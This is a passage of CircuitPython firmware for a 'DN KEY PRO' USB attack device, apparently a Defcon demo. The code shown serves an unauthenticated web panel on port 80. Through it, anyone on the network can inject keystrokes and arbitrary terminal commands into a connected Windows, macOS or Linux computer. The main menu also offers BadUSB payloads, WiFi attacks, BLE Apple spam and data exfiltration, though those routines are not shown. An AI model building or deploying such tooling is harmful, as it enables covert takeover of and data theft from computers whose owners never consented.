    return text.replace("+", " ").replace("%20", " ").replace("%2C", ",").replace("%3F", "?").replace("%21", "!").replace("%40", "@").replace("%23", "#").replace("%24", "$").replace("%25", "%").replace("%5E", "^").replace("%26", "&").replace("%2A", "*").replace("%28", "(").replace("%29", ")").replace("%2D", "-").replace("%3D", "=").replace("%5B", "[").replace("%5D", "]").replace("%7B", "{").replace("%7D", "}").replace("%7C", "|").replace("%5C", "\\").replace("%3A", ":").replace("%3B", ";").replace("%22", '"').replace("%27", "'").replace("%3C", "<").replace("%3E", ">").replace("%2F", "/").replace("%7E", "~")

def create_main_page():
    """Create the main OS selection page."""
    return f"""HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
<title>DN-KEY OS Controls</title>
<style>{CSS}</style>
</head>
<body>
<h1>DN-KEY OS Controls</h1>
<p style="font-size:20px;margin:20px 0">Select your operating system to access OS-specific controls:</p>

<div class="card">
<button class="btn btn-macos" onclick="location.href='/macos'">
<span class="os-icon">{OS_DATA['macos']['icon']}</span>
macOS Controls
</button>

<button class="btn btn-windows" onclick="location.href='/windows'">
<span class="os-icon">{OS_DATA['windows']['icon']}</span>
Windows Controls
</button>

<button class="btn btn-linux" onclick="location.href='/linux'">
<span class="os-icon">{OS_DATA['linux']['icon']}</span>
Linux Controls
</button>
</div>

<div class="card">
<h3 style="font-size:20px;margin-bottom:15px">Universal Controls</h3>
<button class="btn" onclick="location.href='/toggle_mouse'">Toggle Mouse Jiggler</button>
</div>

<div class="card">
<h3 style="font-size:20px;margin-bottom:15px">Keyboard Input</h3>
<form action="/keyboard_input" method="get">
<input type="text" name="text" placeholder="Type text to send to computer..." required style="width:80%;padding:15px;background:#222;color:#00ff00;border:1px solid #00ff00;border-radius:5px;font-size:16px;margin-bottom:10px">
<button type="submit" class="btn">Send Text</button>
<button type="button" class="btn" onclick="location.href='/keyboard_input?text=enter'">Enter</button>
<button type="button" class="btn" onclick="location.href='/keyboard_input?text=tab'">Tab</button>
<button type="button" class="btn" onclick="location.href='/keyboard_input?text=escape'">Escape</button>
</form>
</div>
</body>
</html>"""

def create_os_page(os_type, title, commands):
    """Create OS-specific control page."""
    os_info = OS_DATA[os_type]
    
    # Build command buttons efficiently
    command_buttons = ''.join(f'<button class="btn" onclick="location.href=\'/{os_type}/{cmd_name}\'">{cmd_display}</button>' for cmd_name, cmd_display in commands.items())
    
    return f"""HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
<title>DN-KEY {title} Controls</title>
<style>{CSS}</style>
</head>
<body>
<h1>{os_info['icon']} {title} Controls</h1>

<div class="card">
<h3>System Controls</h3>
{command_buttons}
</div>

<div class="card">
<h3>Volume & Media Controls</h3>
<button class="btn" onclick="location.href='/{os_type}/volume_up'">Volume Up</button>
<button class="btn" onclick="location.href='/{os_type}/volume_down'">Volume Down</button>
<button class="btn" onclick="location.href='/{os_type}/volume_mute'">Mute/Unmute</button>
<button class="btn" onclick="location.href='/{os_type}/media_play'">Play/Pause</button>
</div>

<div class="card">
<h3>Custom Command ({title} Terminal)</h3>
<form action="/execute_command" method="get">
<input type="text" name="cmd" placeholder="{os_info['placeholder']}" required style="width:80%;padding:15px;background:#222;color:#00ff00;border:1px solid #00ff00;border-radius:5px;font-size:16px;margin-bottom:10px">
<input type="hidden" name="os" value="{os_type}">
<button type="submit" class="btn">Execute in Terminal</button>
</form>
</div>

<button class="btn back-btn" onclick="location.href='/'">Back to OS Selection</button>
</body>
</html>"""

def handle_web_request(request):
    """Handle HTTP requests for web controls."""
    request_line = request.splitlines()[0]
    request_method, path, _ = request_line.split()

    if path == "/":
        response = create_main_page()
    elif path == "/macos":
        response = create_os_page('macos', 'macOS', OS_COMMANDS['macos'])
    elif path == "/windows":
        response = create_os_page('windows', 'Windows', OS_COMMANDS['windows'])
    elif path == "/linux":
        response = create_os_page('linux', 'Linux', OS_COMMANDS['linux'])
    elif path == "/toggle_mouse":
        toggle_mouse_jiggler()
        response = create_main_page()
    elif path.startswith("/keyboard_input"):
        if "text=" in path:
            text_part = path.split("text=")[1]
            text_decoded = decode_url(text_part.split("&")[0])
            execute_command(text_decoded, keyboard_mode=True)
        response = create_main_page()
    elif path.startswith("/execute_command"):
        if "cmd=" in path:
            cmd_part = path.split("cmd=")[1]
            cmd_decoded = decode_url(cmd_part.split("&")[0])
            os_type = "macos"  # Default to macOS
            if "os=" in path:
                os_part = path.split("os=")[1]
                os_type = os_part.split("&")[0]
            execute_command(cmd_decoded, os_type)
            # Return to the appropriate OS page instead of main page
            if os_type == "macos":
                response = create_os_page('macos', 'macOS', OS_COMMANDS['macos'])
            elif os_type == "windows":
                response = create_os_page('windows', 'Windows', OS_COMMANDS['windows'])
            elif os_type == "linux":
                response = create_os_page('linux', 'Linux', OS_COMMANDS['linux'])
            else:
                response = create_main_page()
        else:
            response = create_main_page()
    else:
        # Handle OS-specific commands (volume/media etc.)
        path_parts = path.split('/')
        if len(path_parts) >= 3:
            os_type = path_parts[1]
            command = path_parts[2]
            
            if command in UNIVERSAL_COMMANDS:
                execute_command(command)
            else:
                execute_command(command, os_type)
            
            # Return to the appropriate OS page instead of main page
            if os_type == "macos":
                response = create_os_page('macos', 'macOS', OS_COMMANDS['macos'])
            elif os_type == "windows":
                response = create_os_page('windows', 'Windows', OS_COMMANDS['windows'])
            elif os_type == "linux":
                response = create_os_page('linux', 'Linux', OS_COMMANDS['linux'])
            else:
                response = create_main_page()
        else:
            response = create_main_page()
    
    return response


# main starting function
def main():
    # Skip HID initialization in power bank mode to avoid hanging
    global keyboard, keyboard_layout, mouse, consumer_control, hid_available, mouse_counter, do_mouse_jiggle, web_server_socket, main_menu, current_menu
    
    # Set everything to None for power bank mode
    keyboard = None
    keyboard_layout = None
    mouse = None
    consumer_control = None
    hid_available = False
    
    pixels.fill(NEON_ORANGE)  # Orange = skipping HID to avoid hanging
    pixels.show()
    time.sleep(0.3)
    
    # Initialize buttons FIRST (independent of HID)
    pixels.fill(NEON_RED)  # Red = button initialization starting
    pixels.show()
    time.sleep(0.3)
    
    try:
        print("Attempting to initialize buttons...")
        buttons = Buttons()
        print("Buttons initialized successfully")
        pixels.fill(NEON_GREEN)  # Green = buttons success
        pixels.show()
        time.sleep(0.3)
    except Exception as e:
        print(f"Button initialization failed: {e}")
        print(f"Error type: {type(e)}")
        import traceback
        traceback.print_exception(e)
        buttons = None
        pixels.fill(NEON_ORANGE)  # Orange = buttons failed
        pixels.show()
        time.sleep(0.3)

    # HID devices will be initialized on-demand when needed
    print("HID devices will be initialized on-demand")
    pixels.fill(NEON_GREEN)  # Green = ready
    pixels.show()
    time.sleep(0.3)

    main_menu_items = [
        MenuItem("HID BadUSB", load_ducky_menu, "DUCKS!"),
        MenuItem("WiFi Attacks", load_wifi_menu_screen),
        MenuItem("BLE Ops", load_ble_menu_screen),
        MenuItem("Data Exfil", load_data_menu_screen),
        MenuItem("Web Control", load_web_menu_screen),
        MenuItem("Mouse Jiggler", toggle_mouse_jiggler_menu),
        MenuItem("USB Host", load_usb_host_screen),
        MenuItem("System Status", load_status_screen)
    ]

    print("Creating main menu...")
    global main_menu
    try:
        main_menu = MainMenu("DN KEY PRO MENU", main_menu_items)
        print("Main menu created successfully")
    except Exception as e:
        print(f"Main menu creation failed: {e}")
        import traceback
        traceback.print_exception(e)
        return
    
    print("Drawing main menu...")
    try:
        main_menu.draw(display_group)
        print("Main menu drawn successfully")
    except Exception as e:
        print(f"Main menu drawing failed: {e}")
        import traceback
        traceback.print_exception(e)
        return
    
    # set the current_menu to the desired starting view
    global current_menu
    current_menu = main_menu
    print("Current menu set to main menu")

    # Main Loop - faster timing
    print("Starting Defcon Demo...")
    while True:
        try:
            rainbow_cycle(0)  # Increase the number to slow down the rainbow

            current_menu.handle_input(buttons, display_group)
        except Exception as e:
            print(f"Main loop error: {e}")
            import traceback
            traceback.print_exception(e)
            time.sleep(1)  # Wait a bit before continuing
        
        # Run background Apple spam if active
        run_apple_spam_background()
        
        # Run mouse jiggler if active (simplified for sync operation)
        if do_mouse_jiggle:
            mouse_counter += 1
            
            # Only move mouse every 50 iterations (about 0.5 seconds)
            if mouse_counter >= 50:
                try:
                    # Create mouse on-demand if not available
                    if mouse is None:
                        mouse = Mouse(usb_hid.devices)
                        print("Mouse created on-demand for jiggler")
                    
                    x_direction = random.choice([-1, 1]) * random.randint(6, 10)
                    y_direction = random.choice([-1, 1]) * random.randint(3, 10)
                    mouse.move(x=x_direction, y=y_direction)
                    mouse_counter = 0
                except Exception as e:
                    print(f"Mouse jiggler error: {e}")
                    do_mouse_jiggle = False
        

        
        # Run web server if active
        if web_server_running:
            try:
                # Only create server once
                if web_server_socket is None:
                    print("Creating web server socket...")
                    pool = socketpool.SocketPool(wifi.radio)
                    web_server_socket = pool.socket(pool.AF_INET, pool.SOCK_STREAM)
                    web_server_socket.setsockopt(pool.SOL_SOCKET, pool.SO_REUSEADDR, 1)
                    web_server_socket.bind(('0.0.0.0', 80))
                    web_server_socket.listen(1)
                    web_server_socket.setblocking(False)
                    print("Web server socket created and listening on port 80")
                
                # Handle web requests
                try:
                    client, addr = web_server_socket.accept()
                    print(f"Web request from: {addr}")
                    
                    # Read request
                    buffer = bytearray(1024)
                    bytes_read = client.recv_into(buffer)
                    request = buffer.decode('utf-8')
                    
                    if request:
                        response = handle_web_request(request)
                        client.send(response.encode('utf-8'))
                    client.close()
                    
                except OSError as e:
                    if e.errno != 11:  # EAGAIN/EWOULDBLOCK
                        print(f"Web server OSError: {e}")
                except Exception as e:
                    print(f"Web server request error: {e}")
                
            except Exception as e:
                print(f"Web server error: {e}")
                # Reset server socket on error
                if web_server_socket is not None:
                    try:
                        web_server_socket.close()
                    except:
                        pass
                    web_server_socket = None
        
        time.sleep(0.01)  # Reduced from 0.015 for faster response

if __name__ == "__main__":
    print("starting")
    main()
